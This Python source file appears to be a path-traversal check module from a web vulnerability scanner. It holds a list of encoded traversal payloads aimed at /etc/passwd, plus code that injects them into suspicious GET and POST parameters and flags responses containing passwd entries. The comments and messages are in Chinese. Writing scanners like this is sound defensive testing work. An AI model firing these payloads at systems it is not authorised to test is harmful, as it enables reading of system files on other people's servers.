#!/usr/bin/python
# -*- coding: utf-8 -*-
from copy import deepcopy
from engine.engine_utils.common import *
from urlparse import urlparse
from engine.engine_utils.params import query2dict, dict2query, db_params2dict
from engine.logger import scanLogger as logger
# from urllib import urlencode


inj_path_list = [
    "../../../../../../../../../../../../../etc/passwd",
    "/etc/passwd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "././././././././././././././././././././././././../../../../../../../../etc/passwd",
    "./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../etc/passwd",
    ".%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
]


# def run_url(http, ob, item):
#     result = []
#     header = {
#         "Pragma": "no-cache",
#         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
#         "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
#         "Accept-Encoding": "gzip, deflate",
#         "Cache-Control": "no-cache",
#         "Cookie": ob.get('cookie') if ob.get('cookie') else '',
#         "Connection": "keep-alive",
#         "Host": ob['domain']
#     }
#
#     try:
#         url = item['url']
#         params = item['params']
#         if not params:
#             return []
#         method = item['method']
#         if method not in ['get', 'post']:
#             return []
#         url_parse = urlparse(url)
#         scheme = url_parse.scheme
#         domain = url_parse.netloc
#         path = url_parse.path
#         query = url_parse.query
#         source_ip = ob.get('source_ip')
#         if source_ip:
#             domain = source_ip
#         if query:
#             new_url = "%s://%s%s?%s" % (scheme, domain, path, query)
#         else:
#             new_url = "%s://%s%s" % (scheme, domain, path)
#
#         if method == 'post':
#             params_dict = db_params2dict(params)
#         else:
#             params_dict = query2dict(params)
#
#         if re.search(r'download|path|file|page|id', params, re.I):
#             for param_name in params_dict.keys():
#                 params_dict_bak = deepcopy(params_dict)
#                 if re.search(r'download|path|file|page|id', param_name, re.I):
#                     data = traversal_params(ob, http, method, new_url, header, params_dict_bak, param_name)
#                     if data:
#                         result.extend(data)
#                         break
#
#         if not result and re.search(r'\.(php|jsp|jspx|asp|aspx|jpg|jpge|png|gif|html|htm|css|js|rar|gz|zip|apk)', params, re.I):
#             for param_name in params_dict.keys():
#                 params_dict_bak = deepcopy(params_dict)
#                 if re.search(r'\.(php|jsp|jspx|asp|aspx|jpg|jpge|png|gif|html|htm|css|js|rar|gz|zip|apk)', params_dict.get(param_name), re.I):
#                     data = traversal_params(ob, http, method, new_url, header, params_dict_bak, param_name)
#                     if data:
#                         result.extend(data)
#                         break
#
#     except Exception, e:
#         logger.error("File:dir_traversal_unix_url.py, run_url function :%s" % (str(e)))
#     return result
#
#
# def traversal_params(ob, http, method, url, header, params_dict_bak, inj_param):
#     data = []
#     for inj_path in inj_path_list:
#         params_dict_bak[inj_param] = inj_path
#         # new_params_str = urlencode(params_dict_bak)
#         new_params_str = dict2query(params_dict_bak, isUrlEncode=False)
#         if method == "post":
#             new_url = url
#             res, content = http.request(new_url, 'POST', body=new_params_str, headers=header)
#         else:
#             new_url = "%s?%s" % (url, new_params_str)
#             res, content = http.request(new_url, 'GET', headers=header)
#         if res and res.has_key('status') and res['status'] == '200':
#             keyword = re.search(r'(\broot|\bbin|\bnobody):', content)
#             if keyword:
#                 response = getResponse(res, content, '(root|bin|nobody):')
#                 if method == "get":
#                     request = getRequest(new_url, domain=ob['domain'])
#                 else:
#                     request = postRequest(new_url, body=new_params_str, domain=ob['domain'])
#                 detail = "注入参数：" + inj_param
#                 data.append(getRecord(ob, new_url, ob['level'], detail, request, response))
#                 return data
#     return data


def run_url(http, ob, item):
    header = {
        "Pragma": "no-cache",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "no-cache",
        "Cookie": ob.get('cookie') if ob.get('cookie') else '',
        "Connection": "keep-alive",
        "Host": ob['domain']
    }

    result = []
    try:
        url = item.get('url')
        params = item.get('params')
        method = item.get('method')
        source_ip = ob.get('source_ip')
        url_parse = urlparse(url)
        scheme = url_parse.scheme
        domain = url_parse.netloc
        path = url_parse.path
        query = url_parse.query
        if source_ip:
            domain = source_ip
        # 没有参数就不扫
        if not params and not query:
            return []
        # get方法
        if method.lower() == 'get':
            if params:
                query = params
            if query and re.search('page|download|path|file|target', query, re.I):
                query_dict = query2dict(query)
                for key in query_dict.keys():
                    if re.search('page|download|path|file|target', key, re.I):
                        for inj_value in inj_path_list:
                            query_bak = deepcopy(query_dict)
                            query_bak[key] = inj_value
                            new_query = dict2query(query_bak, isUrlEncode=False)
                            new_url = "%s://%s%s?%s" % (scheme, domain, path, new_query)
                            data = traversal_params(ob, http, new_url, 'GET', '', header)
                            if data:
                                result.extend(data)
                                break
        elif method.lower() == 'post':
            body_dict = db_params2dict(params)
            # 注入query，body不变
            if query and re.search('page|download|path|file|target', query, re.I):
                query_dict = query2dict(query)
                for key in query_dict.keys():
                    if re.search('page|download|path|file|target', key, re.I):
                        for inj_value in inj_path_list:
                            query_bak = deepcopy(query_dict)
                            query_bak[key] = inj_value
                            new_query = dict2query(query_bak, isUrlEncode=False)
                            new_url = "%s://%s%s?%s" % (scheme, domain, path, new_query)
                            data = traversal_params(ob, http, new_url, 'POST', dict2query(body_dict, isUrlEncode=False), header)
                            if data:
                                result.extend(data)
                                break
            if body_dict and re.search('page|download|path|file|target', str(params), re.I):
                new_url = "%s://%s%s?%s" % (scheme, domain, path, query)
                for key in body_dict.keys():
                    if re.search('page|download|path|file|target', key, re.I):
                        for inj_value in inj_path_list:
                            body_bak = deepcopy(body_dict)
                            body_bak[key] = inj_value
                            new_body = dict2query(body_bak, isUrlEncode=False)
                            data = traversal_params(ob, http, new_url, 'POST', new_body, header)
                            if data:
                                result.extend(data)
                                break
    except Exception, e:
        logger.error("File:dir_traversal_win_url.py, run_url function :%s" % (str(e)))
    return result


def traversal_params(ob, http, new_url, method, body, header):
    data = []
    res, content = http.request(new_url, method, body=body, headers=header)
    if res and res.has_key('status') and res['status'] == '200':
        keyword = re.search(r'(\broot|\bbin|\bnobody):', content)
        if keyword:
            response = getResponse(res, content, '(root|bin|nobody):')
            request = getRequest(new_url, domain=ob['domain'])
            detail = "存在任意文件读取漏洞"
            data.append(getRecord(ob, new_url, ob['level'], detail, request, response))
            return data
    return data